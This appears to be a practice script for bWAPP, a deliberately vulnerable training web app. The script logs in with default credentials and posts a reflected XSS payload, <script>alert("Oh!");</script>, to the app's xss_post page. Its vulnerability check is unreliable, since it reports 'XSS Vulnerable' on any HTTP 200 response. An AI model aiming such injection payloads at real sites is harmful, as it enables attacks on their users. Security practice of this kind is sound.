import requests
import codecs
from bs4 import BeautifulSoup


#------------------------------------#
#info to create a new users
login = "bee"
password = "bug"
email = "beez@site.com"
security_level = 2
secret = "My secret is sooo sicr3t"
url_base = "http://172.20.9.208"

#add a session to the request
s = requests.session()
#create a header to add it to the request
headers = {
	'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
}

#------------------------------------#
#create a new user page with passed info
url_user_new = url_base + "/bWAPP/user_new.php"
payload = {"action": "create",
			"email": email,
			"login": login,
			"password":	password,
			"password_conf": password,
			"secret": secret
			}
##send a requets to create a user with passed info
# createUserResponse = s.post(url_user_new, data=payload, headers= headers)
##create a user
# createUserResponse

#------------------------------------#
#user login page with passed info
url_login = url_base + "/bWAPP/login.php"
payload = {
			"login": login,
			"password": password,
			"security_level": security_level,
			"form": "submit"
			}
#send a requets to login the user with passed info
loginUserResponse = s.post(url_login, data=payload, headers= headers)
#login the user
loginUserResponse


#------------------------------------#
#go to one xss bug page
url_bugs = url_base + "/bWAPP/xss_post.php"
#inject XSS script to fileds
payload = {
			"firstname":	'<script>alert("Oh!");</script>',
			"form":	"submit",
			"lastname":	''
			}
#send a request to inject the passed values including script injection
bugPageResponse = s.post(url_bugs, data=payload, headers= headers)
#get response of the injection

if bugPageResponse.status_code == 200:
	print("XSS Vulnerable")
else:
	print("Not Vulnerable")



html_page =codecs.open("alert.js.html", "r")

parsed_html = BeautifulSoup(html_page, "html.parser")

# print(parsed_html)
